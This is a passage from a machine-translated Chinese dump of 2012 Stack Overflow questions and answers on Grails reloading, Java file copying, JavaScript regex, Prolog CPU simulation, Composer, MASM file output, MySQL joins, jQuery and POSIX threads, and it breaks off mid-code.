然后我运行我的集成测试'test-app integration：'，一切正常。

但是当我更改任何正在测试的控制器时，更改不会在我的测试结果中生效，我必须退出交互模式并再次访问它。

如何让我的测试重新加载我的控制器？

PD：我的问题很大程度上是由 Grails Guard 插件引起的，它在其使用部分中表明：

'确保测试应用程序的弹簧重新加载代理处于活动状态（默认情况下测试应用程序不是，只有运行应用程序）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T16:30:19.847

将 -reloading 作为第一个参数添加到您的 grails 调用中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T19:58:51.697

在尝试了 Jeff Beck 提出的解决方案之后，我想分享一些例子来澄清一下：

```
grails -reloading -> reload
grails -> reload
grails-debug -reloading -> reload
grails-debug -reloading test -> reload
grails-debug test -> no reload
grails-debug test -reloading -> no reload 
```

我通过首先在我的 1 个控制器中然后在我的 1 个域类中添加和注释异常来测试这一点，并且重新加载对两者都有效。

# java - 如何使用 Java 创建外部 .exe 文件

> ID：13537150
> 
> 赞同：1
> 
> 时间：2012-11-24T00:17:52.857
> 
> 标签：java

我正在存储外部 .exe 文件的所有字节，然后将它们重新写入我当前使用 FileOutputStream/BufferedOutputStream 创建的另一个 .exe 文件。

字节写得很好，第二个程序是在我选择的位置创建的，但是当我运行该文件时，它说它不是有效的 .exe 文件或不是有效的 32/64 位应用程序。

我猜是因为它没有正确打包和生成。

我将如何使它成为一个可执行文件并且与第一个文件一样工作？

ps 我不能使用文件的任何复制，因为最终我将加密字节并将它们写入文件，但我仍然希望它可用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:28:54.617

如果所有字节都相同，它将运行。如果原始文件运行而副本没有运行，则某些字节必须不同。和打包没关系。也许您正在使用字节变量来存储读取的数据。不要那样做。只需使用 int。如果您没有正确使用字节变量，您可能会因为自动符号扩展而遇到问题。

这对我来说很好

```
import java.io.*;

public class Test {

    public static void main(String[] args) throws Exception {
        BufferedInputStream in = new BufferedInputStream(new FileInputStream("a.exe"));
        BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream("b.exe"));
        int data = in.read();
        while(data >= 0) {
            out.write(data);
            data = in.read();
        }
        in.close();
        out.close();
    }
} 
```

# javascript - Javascript 中的 preg_match - 从代码中获取 src（非标准 html 代码）

> ID：13537151
> 
> 赞同：-1
> 
> 时间：2012-11-24T00:18:15.133
> 
> 标签：javascript, regex

我想在 Javascript 中使用 preg_match 。请看部分内容：

```
<tag>lorem ipsum lorem ipsum src="http://www.example.com/files/2012/11/112_156362764.jpg" lorem ipsum lorem ipsum</tag> 
```

我想得到**src**中的内容- 所以完整的 url。我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T00:29:36.713

preg_match[`string.match`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/match)在 javascript 中：

```
str = '<tag>lorem ipsum lorem ipsum src="http://www.example.com/files/2012/11/112_156362764.jpg" lorem ipsum lorem ipsum</tag>'
url = str.match(/src="(.+?)"/)[1] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T00:28:55.900

鉴于您根本没有为您想要的内容提供任何上下文，我所能处理的只是发布的示例和非常字面的问题，所以，这就是说：

```
var span = document.getElementById('test'),
    text = span.firstChild.nodeValue,
    src = text.match(/"(.*)"/)[1];
console.log(src);​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/LWnzu/)。

这将检索`"`字符之间包含的任何内容，更具体地说，仅针对`src="..."`字符串，请使用：

```
var span = document.getElementById('test'),
    text = span.firstChild.nodeValue,
    src = text.match(/src="(.*)"/)[1];
console.log(src);​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/LWnzu/1/)。

上面的内容，为了更实用的方法而重写，并希望有更多的多功能性：

```
function retrievePropertyFromString(needle, haystack) {
    if (!needle || !haystack) {
        return '';
    }
    else {
        var reg = new RegExp(needle + '="(.*)"'),
            matched = haystack.match(reg);
        // if matched is not null AND matched has a length greater than zero:
        //    - return the match
        //    - else return an empty string
        return matched !== null && matched.length > 0 ? matched[1] : '';
    }
}

console.log(retrievePropertyFromString('src',document.getElementById('test').firstChild.nodeValue)); 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/LWnzu/2/)。

参考：

*   [JavaScript 正则表达式](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Regular_Expressions)。
*   [`RegExp()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/RegExp).
*   [`String.match()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/match).

# model - 可以在prolog中模拟一个简单的CPU吗？

> ID：13537154
> 
> 赞同：3
> 
> 时间：2012-11-24T00:18:29.347
> 
> 标签：model, prolog, state-machine, cpu-registers, tree-search

我的理解是 CPU 的简单模型是状态机。

当我查看序言时，它似乎是树搜索（或图形搜索）组合，同时停止运行直到找到它的目标的约束。

有人告诉我，您可以在 prolog 中模拟一个简单的 CPU。

是否可以在 prolog 中像简单的 CPU 一样表示状态机模型？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:24:56.490

Prolog 是图灵完备的语言，因此您可以在其中表达任意计算，包括对 CPU 的模拟。您可以将单个指令的执行表示为 CPU 的两种状态之间的关系，一种在指令执行之前，一种在指令执行之后（接下来要执行的指令也是状态的一部分，因为它例如可用在或通过 CPU 的寄存器之一）：

```
cpustate0_cpustate(State0, State) :-
      .... 
```

程序的完整执行可以声明性地描述为 CPU 的一系列状态转换。在程序上，你转换一个给定的状态，直到它达到某个定义的最终状态，例如，直到某个寄存器包含或指向一个特定的值：

```
cpu_before_after(State0, State) :-
    (    final_state(State0) -> State = State0
    ;    cpustate0_cpustate(State0, State1),
         cpu_before_after(State1, State)
    ). 
```

**编辑**：例如，CPU 的状态可能看起来像 Prolog 术语`cpu(10, 20, 0)` ，它可能是第一个寄存器包含值 10，第二个寄存器包含值 20，第三个寄存器包含值 0 的特定状态。让我们假设第三个寄存器是指令指针IP，CPU总是执行机器RAM中IP指向的指令。所以我们还需要在状态表示中包含机器的 RAM。让我们将机器的状态表示为一对 RAM-CPU，其中 RAM 是机器 RAM 内容的合适表示，而 CPU 是 CPU 寄存器的表示：

```
cpustate0_cpustate(State0, State) :-
     State0 = RAM0-cpu(_,_,IP0),   
     ram_at_value(RAM0, IP0, Instruction),
     instruction_state0_state(Instruction, State0, State). 
```

假设现在有一条指令`add`，它将前两个寄存器的值相加并将结果存储在第一个寄存器中，而 RAM 保持不变：

```
instruction_state0_state(add, RAM-cpu(A0,B,IP), RAM-cpu(A1,B,IP)) :-
    A1 #= A0 + B. 
```

您可以通过此谓词的附加子句来描述其他可用指令的效果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T22:36:21.723

正如 mat 所说，这完全有可能。

当然，这是一个不平凡的问题。

是的，您可以在 prolog 中拥有一个状态机 - 关于在 stackoverflow 上制作一个状态机有几个问题。

我建议虽然 CPU 确实是一个有限状态机，但它很容易成为一个大的——常用的 8051 控制器有 15 个字节的寄存器。由于粗略估计假设任何人都可以假设任何值是合理的，

1 ?- X 是 2^(15*8) | . X = 1329227995784915872903807060280344576。

状态。这还没有对外部存储器进行建模。您可能很难找到具有这么多内存的机器。

您可能会发现状态机的用途是解释单个指令。

所以，如果你是 Prolog 的新手，我建议你在尝试这个范围的东西之前多学习一点。我从玩井字游戏开始。那是关于正确的范围。

# php - 控制 Composer for PHP 编写包的确切文件夹/目录

> ID：13537161
> 
> 赞同：1
> 
> 时间：2012-11-24T00:19:47.063
> 
> 标签：php, wordpress, dependency-management, directory-structure, composer-php

# 的背景

我正在尝试使用[Composer](http://getcomposer.org)来管理 WordPress 插件的依赖项。我已经构建了几个 PHP 库*（[RESTian](https://github.com/newclarity/restian/)和[Sidecar](https://github.com/newclarity/sidecar/)）*，我想将它们包含在我们正在构建的几个插件的子目录中，并且这些 PHP 库托管在 GitHub 上。WordPress 插件*（当前）*托管在私有 BitBucket 存储库中，因为它们是为客户端提供的，但是当我们准备发布它们时，这些插件也将发布到 WordPress 插件存储库中。

# 问题

我想要一个相对于插件根目录`/libraries/restian/`的 目录结构。`/libraries/sidecar/`对于那些了解 WordPress 的人来说，他们最终会像这样安装：

```
/wp-content/plugins/my-wp-plugin/libraries/restian/
/wp-content/plugins/my-wp-plugin/libraries/sidecar/ 
```

问题是我只能让 Composer 将它们放在一个`/newclarity/`子目录中，该子目录比我想要添加到插件的目录结构*（`'newclarity'`是我们的 GitHub 帐户）*更复杂：

```
/wp-content/plugins/my-wp-plugin/libraries/newclarity/restian/
/wp-content/plugins/my-wp-plugin/libraries/newclarity/sidecar/ 
```

# 来源

这是`composer.json`我用来研究和测试的文件：

```
{
  "name":"mikeschinkel/my-wp-plugin",
  "description":"My WordPress Plugin",
  "type":"wordpress-plugin",
  "config":{
    "vendor-dir":"libraries/"
  },
  "require": {
    "newclarity/restian":"dev-master",
    "newclarity/sidecar":"dev-master"
  },
  "repositories":[
    {
      "type":"git",
      "url":"https://github.com/newclarity/restian.git"
    },
    {
      "type":"git",
      "url":"https://github.com/newclarity/sidecar.git"
    }
  ]
} 
```

以下是 GitHub 上托管的库中的当前`composer.json`文件：

```
{
  "name": "newclarity/restian",
  "description": "RESTian: A base class library to simplify building RESTful/Web API clients in PHP",
  "require": {
      "php": ">=5.2.4"
  }
} 
```

和：

```
{
  "name": "newclarity/sidecar",
  "description": "Sidecar: The Missing Plugin API for WordPress",
  "require":{
    "php":">=5.2.4"
  }
} 
```

我已经研究了4个多小时了。任何帮助，将不胜感激。

-麦克风

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T12:42:39.383

您可以尝试使用`wordpress-plugin`与包结合的类型`composer/installers`。[在安装程序自述](https://github.com/composer/installers)文件中阅读有关此内容的更多信息。它应该做你想做的事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T00:41:43.633

> 问题是我只能让 Composer 将它们放在 /newclarity/ 子目录中，这比我想添加到插件的目录结构中更复杂（'newclarity' 是我们的 GitHub 帐户）：

不，那不是真的，至少在你的意思上不是真的。Composer 创建`newclarity`- 文件夹，因为您在包名称中指定它`composer.json`作为包名称的一部分，例如

```
"name": "newclarity/sidecar" 
```

我不确切知道，但你可以尝试将其命名为“sidecar”。但是，不鼓励这样做，因为存在的包越多，包之间的冲突就越可能发生，因此如果没有更高的要求，您应该保留两级文件夹结构，以防止这种情况发生。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T00:30:44.353

所以我想出了一个可行的解决方案，但它并不优雅，我真的希望有一个简单而优雅的解决方案，因此我在 StackOverflow 上发布了我的问题。

在这里没有更好的答案后，我在 Composer 论坛上[**发布**](https://github.com/composer/composer/issues/1355)了一个功能请求，并关闭了请求，因为*“在大多数情况下，代码的安装位置无关紧要”。*可悲的是，有些人觉得他们看重的东西是唯一值得看重的东西。

由于似乎没有正式的方法可以做到这一点，也没有兴趣代表 Composer 团队使其更容易，我决定继续发布我的解决方案，以防其他人以同样的方式撞墙。这很丑陋，但它有效。

不要引用 Git 存储库，而是为每个存储库创建一个*“内联包”* ；这是它的样子*（注意：我添加`'#'`了当然无效的评论，`JSON`但只是在这里标注我所做的更改。）：*

```
{
  "name":"mikeschinkel/my-wp-plugin",
  "description":"My WordPress Plugin",
  "type":"wordpress-plugin",
  "config":{
    "vendor-dir":"libraries"
  },
  "require": {
    "restian":"dev-master",  # Short name 'restian' used here.
    "sidecar":"dev-master"   # Short name 'sidecar' used here.
  },
  "repositories":[
    {
      "type":"package",      # type=package vs. type=git
      "package":{
        "name":"sidecar",    # Short name 'sidecar' used here.
        "version":"dev-master",
        "source":{           # This could be "dist" or "source"
          "type":"git",
          "url":"https://github.com/newclarity/sidecar",
          "reference":"master"
        }
      }
    },
    {
      "type":"package",      # type=package vs. type=git
      "package":{
        "name":"restian",    # Short name 'restian' used here.
        "version":"dev-master",
        "source":{           # This could be "dist" or "source"
          "type":"git",
          "url":"https://github.com/newclarity/restian",
          "reference":"master"
        }
      }
    }
  ]
} 
```

鉴于我是 Composer 的新手，我可能有很多方法可以改进它；欢迎任何建议。无论哪种方式，我希望这可以帮助其他试图实现相同目标的人。

# assembly - 32位汇编语言创建输出文件麻烦

> ID：13537164
> 
> 赞同：4
> 
> 时间：2012-11-24T00:20:05.453
> 
> 标签：assembly, masm, irvine32

使用该程序一段时间后，它在创建输出文件后一直停止。我正在使用 Visual Basic 2010 并且仍然是这方面的初学者。作业问题是这样的：

说明（对称加密）：

1.  编码

    *   要求用户输入一些文本
    *   要求用户键入此范围 [1-255] 内的私钥。执行范围有效性检查。
    *   使用提供的私钥加密输入文本，将密文放在用户命名的文件中。
2.  解码

    *   要求用户指定要解码的文件。
    *   从该文件加载密文并尝试对其进行解密，而不假设私钥与编码中使用的密钥相同。
    *   将所有试验结果放在一个由用户命名的单独文件中。
    *   d。找出最合理的结果（或原始明文）是什么。

我可以弄清楚如何加密文本，但无法使用位于此教科书地址的库创建输出文件： [http ://www.kipirvine.com/asm/examples/index.htm](http://www.kipirvine.com/asm/examples/index.htm)

我将在下面包含我的代码，并通过注释材料显示我对此进行了多少次尝试。这本书没有很好地向我解释，所以如果我能看到它想说什么，那将非常有帮助！

提前致谢！

```
INCLUDE Irvine32.inc

    BUFMAX = 128                    ; maximum buffer size
    KEYMAX = 128                    ; maximum buffer size
    BUFFER_SIZE = 5000

.data

    sPrompt BYTE        "Enter some text message:       ", 0
    keyPrompt   BYTE        "Enter a private key [1-255]:       ", 0
    cFile   BYTE        "Enter a filename for cypher text: ", 0
    sEncrypt    BYTE        "Cypher text                    ", 0
    sDecrypt    BYTE        "Decrypted:                 ", 0
    error   BYTE        "The key must be within 1 - 255!    ", 0
    buffer  BYTE         BUFMAX + 1 DUP(0)
    bufSize DWORD    ?
    keyStr  BYTE         KEYMAX + 1 DUP(0)
    keySize DWORD    ?
    key     DWORD    ?
    filename    BYTE        "newfile.txt                    ", 0
    fileHdl DWORD   ?
    bufFile BYTE        BUFFER_SIZE DUP (?)

.code
main PROC

    call InputTheString             ; input the plain text
    call InputTheKey                ; input the security key
    call CypherFile             ; input a cypher filename
    ;call TranslateBuffer           ; encrypt the buffer
    ;mov edx, OFFSET sEncrypt           ; display encrypted message
    ;call DisplayMessage
    ;call TranslateBuffer           ; decrypt the buffer
    ;mov edx, OFFSET sDecrypt           ; display decrypted message
    ;call DisplayMessage
    exit
main ENDP

InputTheKey PROC

    pushad                      ; save 32-bit registers
LK: mov edx, OFFSET keyPrompt       ; display a prompt
    call WriteString                ; Enter a private key [1-255]
    call Crlf                       ; start a new line
    call ReadInt                    ; read int into system
    mov key, eax                    ; store int into keyStr
    cmp eax, 255                    ; compare newly read int
    ja LC                       ; jump if above 255 to LC
    cmp eax, 1                  ; compare newly read int
    jb LC                       ; jump if below 1 to LC
    jmp LR                      ; if between range jump to LR
LC: mov edx, OFFSET error           ; The key must be within 1 - 255!
    call WriteString                ; Display the error
    call Crlf                       ; start a new line
    loop LK                     ; loop back to enter the security key
LR: popad                       ; restore the registers
    ret
InputTheKey ENDP

CypherFile PROC
    pushad
    mov edx, OFFSET cFile           ; "Enter a filename for cypher text
    call WriteString                ; Enter a name for encrypted file
    call Crlf
    call ReadString             ; Store the filename in eax
    ;mov filename, eax
    mov edx, OFFSET filename
    ;push eax
    ;mov eax, fileHdl
    ;mov edx, OFFSET bufFile
    ;mov ecx, BUFFER_SIZE
    ;mov edx, "C:\outputtext.txt"
    call CreateOutputFile
    ;mov edx, OFFSET filename
    ;mov ecx, SIZEOF filename
    ;push eax
    ;mov eax, bufSize
    call WriteToFile
    pop eax
    ;call CloseFile
    ret
CypherFile ENDP
InputTheString PROC

    pushad                      ; save 32-bit registers
    mov edx, OFFSET sPrompt         ; display a prompt
    call WriteString                ; "Enter some text message"
    call Crlf                       ; start a new line
    mov ecx, BUFMAX             ; maximum character count
    mov edx, OFFSET buffer          ; point to the buffer
    call ReadString             ; input the string
    mov bufSize, eax                ; save the length
    popad
    ret
InputTheString ENDP
    COMMENT !
DisplayMessage PROC

    pushad
    call WriteString
    mov edx, OFFSET buffer          ; display the buffer
    call WriteString
    call Crlf
    call Crlf
    popad
    ret
DisplayMessage ENDP

TranslateBuffer PROC

    pushad
    mov ecx, bufSize                ; loop counter
    mov esi, 0                  ; index 0 in buffer
    mov edi, 0                  ; index 0 in the key
L1:
    mov al, keyStr[edi]             ; get a character from encryption key
    xor buffer[esi], al             ; translate a byte
    inc esi                     ; point to next byte
    inc edi                     ; go to next position in key
    cmp edi, keySize                ; compare if equal to size of the key
    jb L2
    mov edi, 0                  ; reset to beginning of the key
L2: loop L1
    popad
    ret
TranslateBuffer ENDP
!
END main 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:46:20.343

从哪里开始？

您不是缺少一些 ReadString 的参数吗？也许是指向存储输入文件名的位置的指针？接收文件名的缓冲区大小？

`CypherFile`您将所有寄存器推入堆栈，`pushad`但最后，您只有`pop eax`. 大问题，应该是`popad`

就目前而言，它不会向输出文件写入任何内容，因为 WriteToFile 的参数已被注释掉。

编辑 - 违背我的“只是给出代码”你需要告诉 ReadString 在哪里保存输入的文件名和缓冲区的大小。然后将其传递给 CreateOutputFile - 在 CyperFile proc 中 -

```
mov     edx, offset buffer      ; you are missing a buffer for filename
mov     ecx, BUFMAX             ; buffer size
call    ReadString              

mov     edx, offset buffer      ; Pass this to CreateOutputFile
call    CreateOutputFile 
```

现在阅读源代码`CreateOutputFile`，它说它在成功时返回一个文件句柄，将它保存在某个地方。`CloseFile`当您完成对文件的写入时，您可以使用它。如果没有成功创建文件，会返回`INVALID_HANDLE_VALUE`

# vb.net - 带有可视进度条的命令行 wget

> ID：13537165
> 
> 赞同：0
> 
> 时间：2012-11-24T00:20:06.437
> 
> 标签：vb.net, batch-file

在我的批处理程序中，我使用 wget 在后台下载文件。cli 对用户隐藏，我希望能够将进度显示为条形或至少在小窗口中显示为 %。
是不是已经有一个版本的 wget 可以做到这一点，或者我还记得别的什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T05:18:06.563

您无法预测 wget 进行下载所需的时间。因此，您无法显示进度条。

我的建议是壳 wget exe 并使用此[Microsoft KB 链接](http://support.microsoft.com/kb/305368)通过使用 VB.Net 等待壳应用程序完成

当应用程序等待 wget 完成显示 ThinkingBar 控件时，即*通过 winform 应用程序、脚本等*在 PictureBox 控件中显示动画 gif ：

![在此处输入图像描述](../Images/d31d55472a9290ac84849c9dccdce40f.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T08:01:00.473

一些建议：

尝试以管道的形式打开它。wget 的输出应该输入到您的应用程序中。这似乎是最干净的方式。

如果父进程需要是vb.net app，我不知道在vb.net中如何做到这一点。vb6 实现在[这里](https://stackoverflow.com/questions/7386730/shell-process-standard-output-reading-in-visual-basic-6)。

或者尝试使用 vb.net使用[命名管道。](http://support.microsoft.com/?kbid=871044)

或者，在表单中打开它： `wget ... | my_vb_dot_net_app.exe`从批处理脚本。

# eclipse - 如何配置 eclipse 以使用不是由它创建的项目（java）

> ID：13537166
> 
> 赞同：1
> 
> 时间：2012-11-24T00:20:22.920
> 
> 标签：eclipse

我一直在为我的最新项目使用文本编辑器 gedit 和终端，但我发现我有这么多类，为我的 .class 和 .java 文件使用单独的目录会更有用，这样我就可以看到什么是更容易进行。

不幸的是，我无法弄清楚如何让 eclipse 与已经制作的项目一起工作（甚至是已经用另一台计算机在 eclipse 上制作的项目！）。这不是两个或三个班级的问题，但我有这么多，这真的很乏味 - 似乎希望我建立一个全新的项目或什么都不做。

> 编辑（附加信息）：
> 
> 我认为不可能显示项目的代码，因为我目前有 12 个类，但到最后我可能还有一两个......
> 
> 我知道如何在 Eclipse 中创建一个项目。我不确定如何在 eclipse 中打开一个充满 .java 文件的目录，这些文件是使用文本编辑器而不是在 eclipse 项目中创建的，并让 eclipse 接受它作为项目。

有人知道如何完成这项任务吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:17:00.570

您可以按照以下步骤将项目导入 Eclipse：

1.  在 Eclipse 中创建一个新的 Java 项目（通过转到 File -> New -> Java Project）为项目选择一个名称，然后您可以选择完成

2.  您必须将现有代码导入 Eclipse，转到：

    文件 -> 导入 -> 常规 -> 文件系统

    然后浏览到您的代码当前所在的目录，并说您要导入到您在步骤 1 中创建的项目中

之后记得转到项目属性（例如，在导航器视图中右键单击项目文件夹）并确保 java 构建路径配置了正确的源文件夹。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T00:26:02.140

幸运的是，您可以将 eclipse 用于以前创建的任何项目。您是否有代码向我们展示您如何在 Eclipse 中应用到项目？

例如，您可以创建一个项目和类，然后从 public static void main(String[] args) {

向下到底部，然后导入主类名上方的重要内容。

# android - 如何打开 Android 屏幕并使用 WakeLock 解锁？

> ID：13537169
> 
> 赞同：4
> 
> 时间：2012-11-24T00:21:11.040
> 
> 标签：android, wakelock, unlock

我有一个使用 PARTIAL_WAKE_LOCK 在后台运行的服务。它等到有人摇动设备（使用加速度计），然后打开屏幕并开始活动。我使用这段代码来解锁屏幕：

```
 PowerManager TempPowerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock TempWakeLock = TempPowerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "TempWakeLock");
        TempWakeLock.acquire();

        // do the work that needs the visible display... 
```

到目前为止它工作得很好，但是有什么办法可以让手机在屏幕打开后自行解锁，这样用户就不必手动滑动它或写下他的密码？

我尝试使用这个：

```
 mKeyGuardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        mLock = mKeyGuardManager.newKeyguardLock("activity_classname");
        mLock.disableKeyguard(); 
```

但是，我得到了这个奇怪的错误，并且变量名被抚摸了......

```
 The type KeyguardManager.KeyguardLock is deprecated
        Add @SuppressWarnings 'deprecation' to 'mLock' 
```

即使这是正确的解决方案，我也不知道，但它不起作用......有谁知道我应该怎么做？

总结一下，我打算做一个解锁屏幕的服务，这样用户就不用滑动它或写他的密码，然后开始一个活动......有什么想法吗？？

谢谢！

# mysql - MySQL，有没有办法使用多个别名？

> ID：13537170
> 
> 赞同：4
> 
> 时间：2012-11-24T00:21:32.493
> 
> 标签：mysql

假设我们有一个包含以下表格的数据库：
“艺术家”（列：名称，id）和
“歌曲”（标题，作曲家_id，歌曲作者_id）。

我想用作曲家的名字和词曲作者的名字打印歌曲。我仅通过以下方式成功打印了作曲家的名字：

```
SELECT title, name AS Composers_Name 
  FROM artist, song 
    WHERE song.composers_id = artist.id; 
```

我无法获取词曲作者的名字。
我尝试的是：

```
SELECT title, name AS Composers_Name, name AS Songwriters_name
  FROM artist, song 
    WHERE song.composers_id = artist.id AND song.songwriters_id = artist.id; 
```

但这会返回作曲家和词曲作者是同一个人的所有歌曲。我正在考虑使用 JOIN 但我不确定如何..

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T00:29:05.280

您必须从表格艺术家中选择 2 次。

```
select s.title, a1.name AS Composer, a2.name as songwriter
from song s, artist a1, artist a2 
where s.composers_id = a1.id and s.songwriters_id = a2.id; 
```

假设作曲家和作曲家都存储在艺术家表中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T00:26:43.750

使用左连接

```
SELECT s.title, c.name AS Composers_Name, a.name AS Songwriters_name
  FROM song s
  LEFT JOIN artist a ON s.songwriters_id = a.artistID
  LEFT JOIN artist c ON s.composers_id = c.artistID 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T00:35:33.370

我建议使用 join OR 定义每个表别名来访问它们的字段。

```
SELECT a.title, a.name AS Composers_Name, s.name AS Songwriters_name
FROM artist a, song s 
```

但是在您的问题中，词曲作者姓名字段缺失。您可以按照这种方式访问​​它。

# php - 如何用普通图像替换图像按钮

> ID：13537173
> 
> 赞同：0
> 
> 时间：2012-11-24T00:21:52.073
> 
> 标签：php, jquery

```
function insertQuestion(form) {   

var x = "<img src='Images/plussigndisabled.jpg' width='30' height='30' alt='Look Up Previous Question' class='plusimage' name='plusbuttonrow'/><span id='plussignmsg'>(Click Plus Sign to look <br/> up Previous Questions)</span>" ;

    if (qnum == <?php echo (int)$_SESSION['textQuestion']; ?>) {

   $('#mainPlusbutton').html(x); // no need to create a jQuery object

}

//append rows into a table code, not needed for this question

}

<form id="QandA" action="<?php echo htmlentities($action); ?>" method="post">

<table id="question">

<tr>
<td colspan="2">
<a onclick="return plusbutton();">
<img src="Images/plussign.jpg" width="30" height="30" alt="Look Up Previous Question" class="plusimage" id="mainPlusbutton" name="plusbuttonrow"/>
</a>
<span id="plussignmsg">(Click Plus Sign to look up Previous Questions)</span>
</td>
</tr>
</table>

<table id="questionBtn" align="center">
<tr>
<th>
<input id="addQuestionBtn" name="addQuestion" type="button" value="Add Question" onClick="insertQuestion(this.form)" />
</th>
</tr>
</table>

</form> 
```

上面的代码假设发生的是用户单击“添加问题”按钮，这会将问题编号附加到表格中。现在假设发生的是，如果在 jquery 函数中满足 if 语句，那么它假设将加号按钮图像替换`Images/plussign.jpg`为`Images/plussigndisabled.jpg`. 但它没有这样做。

所以我的问题是用另一个图像按钮替换图像按钮的最佳方法是什么？同样在文档准备功能中，我需要它返回显示`Images/plussign.jpg`按钮。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:30:16.620

那段代码让我头疼。

你的代码

```
$('#mainPlusbutton').html(x); 
```

指图像标签。您的调用`html`应该替换标签的*内部*，但图像标签不能包含任何内容，因此没有什么可替换的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T00:48:09.977

`replaceWith()`如果您想用新的html替换整个按钮，可以使用方法

```
$('#mainPlusbutton').replaceWith(x); 
```

API 参考：[http ://api.jquery.com/replaceWith/](http://api.jquery.com/replaceWith/)

我怀疑你真的只想替换`src`按钮的，同时禁用它，这可以用`attr()`和`prop()`方法来完成

```
var newImage='Images/plussigndisabled.jpg';

$('#mainPlusbutton').attr('src',newImage).prop('disabled',true); 
```

请注意，ID 在页面中必须是唯一的，因此如果您要复制行，则需要修改为使用类并修改遍历以更改适当的元素

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T00:44:55.010

我建议使用 span 或 div 来封闭这个图像标签。

```
<img src="Images/plussign.jpg" width="30" height="30" alt="Look Up Previous Question" class="plusimage" id="mainPlusbutton" name="plusbuttonrow"/> 
```

并以此更改脚本。

```
$('#mainPlusbutton').parent().html(x); 
```

# c - C POSIX 线程的互斥体/条件的工作方式因变量所在的位置而异

> ID：13537174
> 
> 赞同：3
> 
> 时间：2012-11-24T00:22:36.223
> 
> 标签：c, multithreading, posix, mutex

我在 C POSIX 线程中看到互斥体/条件的意外行为，具体取决于互斥体和条件变量是否设置在全局范围（有效）中的结构（有时有效）中。

我在 Mac 上编程，然后在 Linux 机器上运行相同的代码。我从这个例子中复制了代码，它在两台机器上都按预期工作：http: [//publib.boulder.ibm.com/infocenter/iseries/v7r1m0/index.jsp](http://publib.boulder.ibm.com/infocenter/iseries/v7r1m0/index.jsp?topic=%2Fapis%2Fusers_73.htm) ?topic=%2Fapis%2Fusers_73.htm 这个例子有`pthread_mutex_t`并`pthread_cond_t`在全球范围内：

```
pthread_cond_t      cond  = PTHREAD_COND_INITIALIZER;
pthread_mutex_t     mutex = PTHREAD_MUTEX_INITIALIZER;
...
pthread_mutex_lock(&mutex);
... 
```

但是，如果我将其更改为将 cond 和 mutex 存储在一个结构中，它可以在 Mac 上运行，但在 Linux 上不起作用*。*

以下是我所做更改的概述：

```
typedef struct _test_data_t {
  pthread_mutex_t cond;
  pthread_cond_t mutex;
} test_data_t;
...
pthread_mutex_lock(&(test_data->mutex));
... 
```

这是我在 Mac 上得到的输出（有效）

```
创建 5 个线程
线程阻塞
线程阻塞
线程阻塞
线程阻塞
线程阻塞
唤醒所有等待的线程...
等待线程和清理
主要完成

```

这是 Linux 上的输出（不起作用）

```
创建 5 个线程
线程阻塞 // 永远挂在这里，其他线程无法锁定互斥锁

```

有谁知道为什么会发生这种情况？我承认我不是 C 专家，所以我不知道从使用全局变量到结构变量的切换会发生什么。

在此先感谢您的帮助。

* * *

这是代码（为简洁起见，去掉了一些错误检查）：

```
typedef struct _test_data_t {
  int conditionMet;
  pthread_mutex_t cond;
  pthread_cond_t mutex;
} test_data_t;

void *threadfunc(void *parm)
{
  int           rc;
  test_data_t *test_data = (test_data_t *) parm;

  rc = pthread_mutex_lock((pthread_mutex_t *)&(test_data->mutex));

  while (!test_data->conditionMet) {
    printf("Thread blocked\n");
    rc = pthread_cond_wait(&test_data->cond, &test_data->mutex);
  }

  rc = pthread_mutex_unlock(&test_data->mutex);
  return NULL;
}

void runThreadTest() {

  int NTHREADS = 5;

  int                   rc=0;
  int                   i;

  // Initialize mutex/condition.
  test_data_t test_data;
  test_data.conditionMet = 0;
  rc = pthread_mutex_init(&test_data.mutex, NULL);
  rc = pthread_cond_init(&test_data.cond, NULL);

  // Create threads.
  pthread_t             threadid[NTHREADS];

  printf("Create %d threads\n", NTHREADS);
  for(i=0; i<NTHREADS; ++i) {
    rc = pthread_create(&threadid[i], NULL, threadfunc, &test_data);
  }

  sleep(5);
  rc = pthread_mutex_lock(&test_data.mutex);

  /* The condition has occurred. Set the flag and wake up any waiting threads */
  test_data.conditionMet = 1;
  printf("Wake up all waiting threads...\n");
  rc = pthread_cond_broadcast(&test_data.cond);

  rc = pthread_mutex_unlock(&test_data.mutex);

  printf("Wait for threads and cleanup\n");
